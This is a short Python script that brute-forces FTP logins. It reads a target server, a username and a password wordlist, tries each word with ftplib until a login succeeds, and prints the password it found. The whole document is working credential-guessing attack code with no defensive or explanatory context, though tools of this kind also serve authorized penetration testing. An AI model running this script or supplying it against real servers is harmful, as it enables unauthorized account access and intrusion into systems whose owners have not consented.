#!/usr/bin/python3

import ftplib

server = input("FTP Server: ")
user = input("Username: ")
password_list = input("Path to Password List: ")

try:
    with open(password_list, 'r') as pw:
        for word in pw:
            word = word.strip('\r\n')
            try:
                ftp = ftplib.FTP(server)
                ftp.login(user, word)
                print("Success! The password is " + word)
                ftp.quit()
                break
            except ftplib.error_perm as exc:
                print("Still trying...", exc)
except Exception as exc:
    print("Word list error:", exc)



   
 


  